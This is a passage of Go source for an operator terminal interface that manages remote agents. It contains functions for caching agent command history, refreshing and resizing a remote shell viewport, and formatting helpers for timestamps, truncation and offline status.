		m.historyEntries = cloneHistoryEntries(cached)
		m.historySelected = 0
		m.refreshHistoryViewports()
		m.status = fmt.Sprintf("Showing cached history for agent:%s", shortAgentID(agentID))
		return nil
	}
	if m.historyClient == nil {
		m.status = "History service unavailable."
		return nil
	}
	m.status = fmt.Sprintf("Loading history for agent:%s...", agentID)
	return fetchAgentHistory(m.historyClient, agentID)
}

func (m *operatorModel) upsertHistoryEntry(agentID string, entry *pb.AgentHistoryEntry) {
	existing := m.historyCache[agentID]
	updated := make([]*pb.AgentHistoryEntry, 0, len(existing)+1)
	inserted := false
	for _, current := range existing {
		if current.GetTaskId() == entry.GetTaskId() {
			if !inserted {
				updated = append(updated, cloneHistoryEntry(entry))
				inserted = true
			}
			continue
		}
		updated = append(updated, current)
	}
	if !inserted {
		updated = append([]*pb.AgentHistoryEntry{cloneHistoryEntry(entry)}, updated...)
	}
	if len(updated) > 200 {
		updated = updated[:200]
	}
	m.historyCache[agentID] = updated
	m.rebuildAgentOrder()
}

func (m *operatorModel) cachedHistoryAgentID() (string, bool) {
	if m.historyAgentID != "" {
		if entries, ok := m.historyCache[m.historyAgentID]; ok && len(entries) > 0 {
			return m.historyAgentID, true
		}
	}

	var (
		bestAgentID string
		bestTime    int64
		found       bool
	)
	for agentID, entries := range m.historyCache {
		if len(entries) == 0 {
			continue
		}
		executedAt := entries[0].GetExecutedAt()
		if !found || executedAt > bestTime {
			bestAgentID = agentID
			bestTime = executedAt
			found = true
		}
	}
	return bestAgentID, found
}

func (m *operatorModel) refreshShellViewport() {
	content := m.shellOutput
	if m.shellInputBuffer != "" {
		content += m.shellInputBuffer
	}
	if content == "" {
		m.shellViewport.SetContent("No shell output yet.")
		return
	}
	m.shellViewport.SetContent(content)
	m.shellViewport.GotoBottom()
}

func (m *operatorModel) resizeShell() {
	if !m.shellReady || m.shellStream == nil || m.shellSessionID == "" {
		return
	}
	_ = m.shellStream.Send(&pb.OperatorShellRequest{
		Type:      "resize",
		SessionId: m.shellSessionID,
		Cols:      int32(maxInt(m.shellViewport.Width, 80)),
		Rows:      int32(maxInt(m.shellViewport.Height, 24)),
	})
}

func (m *operatorModel) ensureHistorySelectionVisible() {
	if len(m.historyEntries) == 0 {
		m.historyListViewport.GotoTop()
		return
	}

	selectionLine := m.historySelected + 2
	top := m.historyListViewport.YOffset
	bottom := top + m.historyListViewport.Height - 1
	if selectionLine < top {
		m.historyListViewport.SetYOffset(selectionLine)
		return
	}
	if selectionLine > bottom {
		m.historyListViewport.SetYOffset(selectionLine - m.historyListViewport.Height + 1)
	}
}

func renderCommand(entry *pb.AgentHistoryEntry) string {
	if entry.GetArgs() == "" {
		return entry.GetCommand()
	}
	return entry.GetCommand() + " " + entry.GetArgs()
}

func trimToWidth(s string, width int) string {
	if width <= 0 {
		return ""
	}
	if lipgloss.Width(s) <= width {
		return s
	}
	if width == 1 {
		return "…"
	}

	runes := []rune(s)
	for len(runes) > 0 && lipgloss.Width(string(runes)) > width-1 {
		runes = runes[:len(runes)-1]
	}
	return string(runes) + "…"
}

func formatMillis(v int64) string {
	if v == 0 {
		return "-"
	}
	return time.UnixMilli(v).Format("2006-01-02 15:04:05")
}

func shortAgentID(id string) string {
	if len(id) <= 8 {
		return id
	}
	return id[:8]
}

func cloneHistoryEntries(entries []*pb.AgentHistoryEntry) []*pb.AgentHistoryEntry {
	cloned := make([]*pb.AgentHistoryEntry, 0, len(entries))
	for _, entry := range entries {
		cloned = append(cloned, cloneHistoryEntry(entry))
	}
	return cloned
}

func cloneHistoryEntry(entry *pb.AgentHistoryEntry) *pb.AgentHistoryEntry {
	if entry == nil {
		return nil
	}
	copy := *entry
	return &copy
}

func extractStatus(payload string) string {
	start := strings.LastIndex(payload, "[")
	end := strings.LastIndex(payload, "]")
	if start == -1 || end == -1 || end <= start+1 {
		return ""
	}
	return payload[start+1 : end]
}

func renderOfflineSummary(summary string) string {
	summary = strings.TrimSpace(summary)
	if summary == "" {
		return "[OFFLINE]"
	}

	start := strings.LastIndex(summary, "[")
	end := strings.LastIndex(summary, "]")
	if start != -1 && end == len(summary)-1 && end > start {
		summary = strings.TrimSpace(summary[:start])
	}
	if summary == "" {
		return "[OFFLINE]"
	}
	return summary + " [OFFLINE]"
}

func maxInt(a, b int) int {
	if a > b {
		return a
	}
	return b
}
